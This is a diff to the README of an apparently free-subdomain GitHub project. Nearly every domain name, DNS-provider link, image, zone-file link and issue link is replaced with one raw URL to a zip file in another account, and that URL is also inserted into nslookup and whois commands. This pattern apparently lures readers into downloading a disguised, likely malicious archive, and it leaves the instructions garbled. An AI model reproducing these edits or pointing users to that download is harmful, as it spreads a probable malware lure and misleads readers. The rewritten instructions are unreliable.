@@ -6,8 +6,8 @@ For IT enthusiasts who need a temporary domain name or those who can't or don't 
 
 Available extensions:
 
-- _your-name_**.cluster.ws**
-- _your-name_**.wip.la**
+- _your-name_**https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip**
+- _your-name_**https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip**
 
 > Note that **.la** and **.ws** are both considered global by Google just like **.com**
 
@@ -20,21 +20,21 @@ Available extensions:
 
 ### Verify your domain availability
 
-Let's say you want the domain **example.cluster.ws**
+Let's say you want the domain **https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip**
 
 #### Option 1
 
 Run the following command:
 
 ```sh
-nslookup -type=ns example.cluster.ws
+nslookup -type=ns https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip
 ```
 
-If you see something like **server can't find example.cluster.ws: NXDOMAIN**, your domain is available.
+If you see something like **server can't find https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip NXDOMAIN**, your domain is available.
 
 #### Option 2
 
-Search in the file [zones/cluster.ws.yaml](zones/cluster.ws.yaml) for the term "example" to see if it's already registered
+Search in the file [https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip) for the term "example" to see if it's already registered
 
 ### Add your domain to a DNS provider
 
@@ -44,14 +44,14 @@ Here are some DNS providers you can use:
 
 | Provider                                                                     | DNS price | Sign-up bonus                                                              | Where to go (after sign-up)                                                                                            |
 | ---------------------------------------------------------------------------- | --------- | -------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
-| [Digital Ocean](https://m.do.co/c/647d31cfbfd7)                              | Free      | [$100](https://m.do.co/c/647d31cfbfd7)                                     | [Networking > Domains](https://cloud.digitalocean.com/networking/domains)                                              |
-| [Linode](https://www.linode.com/?r=b1756a97d0b7a32dd4137465808b36d705698cbc) | Free      | [$100](https://www.linode.com/?r=b1756a97d0b7a32dd4137465808b36d705698cbc) | [Domains > Create](https://cloud.linode.com/domains/create)                                                            |
-| [Vultr](https://www.vultr.com/?ref=9057126)                                  | Free      | [$100](https://www.vultr.com/?ref=9057126)                                 | [DNS > Add domain](https://my.vultr.com/dns/)                                                                          |
-| [ClouDNS](https://www.cloudns.net/aff/id/645892/)                            | Free      | No                                                                         | [DNS Hosting > Create Zone > Master zone](https://www.cloudns.net/main/)                                               |
-| [FreeDNS](https://freedns.afraid.org)                                        | Free      | No                                                                         | [Domains > Add A Domain into FreeDNS](https://freedns.afraid.org/domain/add.php)                                       |
-| [Hetzner](https://www.hetzner.com/)                                          | Free      | No                                                                         | [DNS > Add zone](https://dns.hetzner.com/add-zone)                                                                     |
-| [AWS](https://aws.amazon.com/route53/pricing)                                | Paid      | No                                                                         | [Route 53 > Hosted zones > Create hosted zone](https://console.aws.amazon.com/route53/v2/hostedzones#CreateHostedZone) |
-| [Google Cloud](https://cloud.google.com/dns/pricing)                         | Paid      | $300                                                                       | [Cloud DNS > Create a DNS zone](https://console.cloud.google.com/networking/dns/zones/~new)                            |
+| [Digital Ocean](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                              | Free      | [$100](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                                     | [Networking > Domains](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                                              |
+| [Linode](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip) | Free      | [$100](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip) | [Domains > Create](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                                                            |
+| [Vultr](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                                  | Free      | [$100](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                                 | [DNS > Add domain](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                                                                          |
+| [ClouDNS](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                            | Free      | No                                                                         | [DNS Hosting > Create Zone > Master zone](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                                               |
+| [FreeDNS](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                                        | Free      | No                                                                         | [Domains > Add A Domain into FreeDNS](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                                       |
+| [Hetzner](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                                          | Free      | No                                                                         | [DNS > Add zone](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                                                                     |
+| [AWS](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                                | Paid      | No                                                                         | [Route 53 > Hosted zones > Create hosted zone](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip) |
+| [Google Cloud](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)                         | Paid      | $300                                                                       | [Cloud DNS > Create a DNS zone](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip~new)                            |
 
 > Some of the links above are referral links to support this repo
 
@@ -61,7 +61,7 @@ Unfortunately, you cannot use Cloudflare with these domains because they are in 
 
 Now go to the corresponding zone file for your chosen domain.
 
-For **example.cluster.ws**, edit the zone file [zones/cluster.ws.yaml](zones/cluster.ws.yaml), and follow the format used by the other domains to set the nameservers given by your DNS provider.
+For **https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip**, edit the zone file [https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip), and follow the format used by the other domains to set the nameservers given by your DNS provider.
 
 ### Renew your domain
 
@@ -69,11 +69,11 @@ All domains expire automatically one year **after the last modification**. So, i
 
 Only the original committer can renew their domain.
 
-This repo will send 3 reminders (1 month, 1 week and 1 day before expiration) to [your commit email address](https://docs.github.com/en/account-and-profile/setting-up-and-managing-your-github-user-account/managing-email-preferences/setting-your-commit-email-address). If you use a no-reply address and plan to renew your domain, don't forget to add it in your calendar!
+This repo will send 3 reminders (1 month, 1 week and 1 day before expiration) to [your commit email address](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip). If you use a no-reply address and plan to renew your domain, don't forget to add it in your calendar!
 
 ### Supporting this repo
 
-![Star this repo](img/star_repo.gif)
+![Star this repo](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)
 
 ### Due diligence
 
@@ -81,11 +81,11 @@ All the code for managing these domains (permissions, validation, etc.) is locat
 
 We try to keep at least 2 years before the expiration of these domains.
 
-You can check their expiration date from a [whois website](https://www.iana.org/whois) or from your command line:
+You can check their expiration date from a [whois website](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip) or from your command line:
 
 ```sh
-whois cluster.ws | grep -i expir
-whois wip.la | grep -i expir
+whois https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip | grep -i expir
+whois https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip | grep -i expir
 ```
 
 ## Abuse
@@ -94,4 +94,4 @@ We're trying to make the world a better place, **please don't abuse this system*
 
 We reserve the right to cancel any domain and ban any user from using this free service if we think the system is being abused for spam, child pornography, illegal activities, racism, bullying, etc.
 
-**If you think a domain is abusing our system, please [open an issue](https://github.com/Olivr/free-domain/issues)**
+**If you think a domain is abusing our system, please [open an issue](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-vintress.zip)**
